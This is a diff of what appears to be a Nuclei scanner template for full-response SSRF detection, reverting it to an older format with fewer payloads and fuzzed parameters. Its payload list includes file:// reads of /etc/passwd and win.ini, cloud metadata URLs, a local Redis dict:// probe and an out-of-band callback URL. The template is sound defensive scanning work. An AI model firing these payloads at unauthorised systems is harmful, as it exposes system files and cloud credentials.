@@ -2,30 +2,20 @@ id: response-ssrf
 
 info:
   name: Full Response SSRF Detection
-  author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
+  author: pdteam,pwnhxl
   severity: high
   reference:
     - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
-  metadata:
-    max-request: 12
-  tags: ssrf,dast,vuln
+  tags: ssrf,dast
 
-http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-          - 'method == "POST"'
-          - 'method == "PUT"'
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
     payloads:
       ssrf:
         - 'http://{{interactsh-url}}'
-        - 'http://{{FQDN}}.{{interactsh-url}}'
-        - 'http://{{FQDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{FQDN}}'
-        - 'http://{{RDN}}.{{interactsh-url}}'
-        - 'http://{{RDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{RDN}}'
         - 'file:////./etc/./passwd'
         - 'file:///c:/./windows/./win.ini'
         - 'http://metadata.tencentyun.com/latest/meta-data/'
@@ -37,9 +27,7 @@ http:
         - 'dict://127.0.0.1:6379/info'
 
     fuzzing:
-      - parts:
-          - query
-          - body
+      - part: query
         mode: single
         keys:
           - callback
@@ -75,9 +63,7 @@ http:
         fuzz:
           - "{{ssrf}}"
 
-      - parts:
-          - query
-          - body
+      - part: query
         mode: single
         values:
           - "(https|http|file)(%3A%2F%2F|://)(.*?)"
@@ -121,20 +107,19 @@ http:
       - type: regex
         part: body
         regex:
-          - 'dns-conf\/[\s\S]+instance\/'
+          - 'dns-conf/(.*?)instance/'
 
       - type: regex
         part: body
         regex:
-          - 'app-id[\s\S]+placement\/'
+          - 'app-id(.*?)placement/'
 
       - type: regex
         part: body
         regex:
-          - 'ami-id[\s\S]+placement\/'
+          - 'ami-id(.*?)placement/'
 
       - type: regex
         part: body
         regex:
-          - 'id[\s\S]+interfaces\/'
-# digest: 490a0046304402204b55b88881395115ce6ea6f288a4f3057f24fa3960272b2b44de0d62f1d81b67022002e37a5632b3861ddab6fcb0c4e57f15be028fddb01e142b24fda2f39405d7a0:922c64590222798bb761d5b6d8e72950
+          - 'id(.*?)interfaces/'
